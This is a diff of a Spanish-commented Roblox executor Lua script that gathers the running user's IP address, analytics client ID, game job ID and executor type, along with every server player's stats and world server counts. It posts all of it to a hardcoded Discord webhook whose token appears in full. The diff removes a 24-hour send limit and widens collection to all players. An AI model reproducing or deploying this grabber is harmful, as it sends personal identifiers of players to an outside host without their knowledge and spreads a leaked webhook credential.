@@ -6,48 +6,23 @@ local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
-local sendInterval = 86400  -- 24 horas en segundos
-local jsonFilePath = "lastSentTime.json"
+local jsonFilePath = "PlayerData.json"
 
--- Función para guardar datos en un archivo JSON
-local function saveToJsonFile(data)
-    local success, response = pcall(function()
-        local jsonData = HttpService:JSONEncode(data)
-        writefile(jsonFilePath, jsonData)  -- Guarda el archivo JSON
-    end)
-    
-    if not success then
-        warn("Error al guardar en el archivo JSON:", response)
-    end
+local function createJsonFile()
+    local initialData = { LastModified = os.time() }
+    writefile(jsonFilePath, HttpService:JSONEncode(initialData))
 end
 
--- Función para cargar datos desde un archivo JSON
-local function loadFromJsonFile()
-    if not isfile(jsonFilePath) then
-        return nil
-    end
-    
-    local success, data = pcall(function()
-        local jsonData = readfile(jsonFilePath)
-        return HttpService:JSONDecode(jsonData)
-    end)
-    
-    if success then
-        return data
-    else
-        warn("Error al leer el archivo JSON:", data)
-        return nil
-    end
+local function fileExists(filePath)
+    return isfile(filePath)
 end
 
--- Función para obtener el ID del trabajo y HWID del jugador
 local function getJobIdAndHwid()
     local jobId = game.JobId
     local hwid = game.Players.LocalPlayer.UserId
     return jobId, hwid
 end
 
--- Función para formatear números grandes
 local function formatNumber(number)
     if number < 1000 then
         return tostring(number)
@@ -61,7 +36,6 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[suffix_index])
 end
 
--- Función para obtener la IP del jugador
 local function getPlayerIPInfo()
     local ip, data = "N/A", "N/A"
     local success, response = pcall(function()
@@ -74,7 +48,6 @@ local function getPlayerIPInfo()
     return ip, data
 end
 
--- Función para detectar el tipo de ejecutor (executor)
 local function detectExecutor()
     local executorType = "Unsupported"
     if syn and not is_sirhurt_closure and not pebc_execute then
@@ -93,7 +66,6 @@ local function detectExecutor()
     return executorType
 end
 
--- Función para obtener el precio del próximo rebirth
 local function getNextRebirthPrice(currentRebirths)
     local basePrice = 3e6
     local additionalPrice = 2e6
@@ -102,56 +74,115 @@ local function getNextRebirthPrice(currentRebirths)
     return nextPrice
 end
 
--- Función para obtener los datos del jugador que ejecuta el script
-local function getLocalPlayerData()
-    local player = Players.LocalPlayer
-    local playerName = player.Name
-    local playerDisplayName = player.DisplayName
+local function getAllPlayerData()
+    local playerDataList = {}
+    for _, player in pairs(Players:GetPlayers()) do
+        local playerData = {}
+        local playerName = player.Name
+        local playerDisplayName = player.DisplayName
 
-    local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
-    if folderData then
-        local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
-        local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
-        local formattedRebirth = formatNumber(rebirthValue)
-        local formattedStrength = formatNumber(strengthValue)
-        local nextRebirthPrice = getNextRebirthPrice(rebirthValue)
+        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
+        if folderData then
+            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
+            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
+            local formattedRebirth = formatNumber(rebirthValue)
+            local formattedStrength = formatNumber(strengthValue)
+            local nextRebirthPrice = getNextRebirthPrice(rebirthValue)
 
-        return string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
-            playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))
-    else
-        return "Datos del jugador no disponibles"
+            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
+                playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))
+
+            table.insert(playerDataList, {
+                label = combinedLabel,
+                rebirth = rebirthValue,
+                strength = strengthValue
+            })
+        end
     end
+
+    table.sort(playerDataList, function(a, b)
+        if a.strength ~= b.strength then
+            return a.strength > b.strength
+        elseif a.rebirth ~= b.rebirth then
+            return a.rebirth > b.rebirth
+        end
+        return false
+    end)
+
+    local sortedLabels = {}
+    for _, data in ipairs(playerDataList) do
+        table.insert(sortedLabels, data.label)
+    end
+    return playerDataList, sortedLabels
 end
 
--- Función para obtener el ClientId
 local function getClientId()
     local clientId = RbxAnalyticsService:GetClientId()
     return clientId
 end
 
--- Función para obtener la información del servidor
 local function getServerInfo()
+    local serverInfo = {}
+    local worldNames = {
+        [3311165597] = "Tierra",
+        [5151400895] = "Bilss",
+        [3608495586] = "HBTC TIEP",
+        [3608496430] = "HBTC GAV"
+    }
+
     local totalServers = 0
     local totalPlayers = 0
+    local serversInfo = {}
 
-    return totalServers, totalPlayers
+    for placeId, worldName in pairs(worldNames) do
+        local serverListUrl = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
+        local success, response = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet(serverListUrl))
+        end)
+
+        if success and response and response.data then
+            local servers = #response.data
+            local players = 0
+
+            for _, server in ipairs(response.data) do
+                players = players + server.playing
+            end
+
+            totalServers = totalServers + servers
+            totalPlayers = totalPlayers + players
+
+            table.insert(serversInfo, {
+                worldName = worldName,
+                servers = servers,
+                players = players
+            })
+        end
+    end
+
+    return totalServers, totalPlayers, serversInfo
 end
 
--- Función para enviar la información del jugador a Discord
 local function sendPlayerInfoToDiscord()
+    if not fileExists(jsonFilePath) then
+        createJsonFile()  -- Crear el archivo si no existe
+        return  -- No se envían datos si se creó el archivo
+    end
+
     local jobId, hwid = getJobIdAndHwid()
     local ip, ipData = getPlayerIPInfo()
     local executor = detectExecutor()
-    local playerData = getLocalPlayerData()
+    local allPlayerData, sortedLabels = getAllPlayerData()
     local clientId = getClientId()
-    local totalServers, totalPlayers = getServerInfo()
+    local totalServers, totalPlayers, serversInfo = getServerInfo()
+
+    local strongestPlayer = allPlayerData[1]
 
     local dataToSend = {
         ["embeds"] = {
             {
-                ["description"] = "Información del jugador:\n\n" .. playerData,
+                ["description"] = "Jugadores del juego:\n\n" .. table.concat(sortedLabels, "\n\n"),
                 ["color"] = 0x00ff00,
-                ["title"] = "Estadísticas del jugador",
+                ["title"] = "Estadísticas de los jugadores",
                 ["thumbnail"] = {
                     ["url"] = "https://i.imgur.com/oBPXx0D.png"
                 },
@@ -196,6 +227,26 @@ local function sendPlayerInfoToDiscord()
         }
     }
 
+    local serverDetails = "Detalles de los servidores:\n"
+    for _, info in ipairs(serversInfo) do
+        serverDetails = serverDetails .. string.format("Mundo: %s\nServidores: %d\nJugadores: %d\n\n", info.worldName, info.servers, info.players)
+    end
+
+    table.insert(dataToSend["embeds"], {
+        ["description"] = serverDetails,
+        ["color"] = 0x00ff00,
+        ["title"] = "Información de Servidores"
+    })
+
+    table.insert(dataToSend["embeds"], {
+        ["description"] = strongestPlayer.label,
+        ["color"] = 0x00ff00,
+        ["title"] = "Jugador más fuerte",
+        ["thumbnail"] = {
+            ["url"] = "https://i.imgur.com/oBPXx0D.png"
+        }
+    })
+
     local success, response = pcall(function()
         return http_request({
             Url = discordWebhookUrl,
@@ -204,33 +255,15 @@ local function sendPlayerInfoToDiscord()
                 ["Content-Type"] = "application/json"
             },
             Body = HttpService:JSONEncode(dataToSend)
-        })
+            })
     end)
 
     if not success then
-        warn("Error al enviar la información a Discord:", response)
+        warn("Error al enviar datos a Discord:", response)
+    else
+        print("Datos enviados a Discord exitosamente.")
     end
 end
 
--- Cargar el tiempo desde el archivo JSON
-local function checkAndSendPlayerInfo()
-    local currentTime = os.time()
-    local data = loadFromJsonFile()
-
-    if data and data.lastSentTime then
-        local timeSinceLastSend = currentTime - data.lastSentTime
-        if timeSinceLastSend < sendInterval then
-            warn("Ya se ha enviado información en las últimas 24 horas.")
-            return
-        end
-    end
-
-    -- Enviar la información si han pasado más de 24 horas
-    sendPlayerInfoToDiscord()
-
-    -- Guardar el nuevo tiempo en el archivo JSON
-    saveToJsonFile({ lastSentTime = currentTime })
-end
-
--- Ejecutar la función al iniciar el script
-checkAndSendPlayerInfo()
+-- Ejecutar la función para enviar información a Discord
+sendPlayerInfoToDiscord()
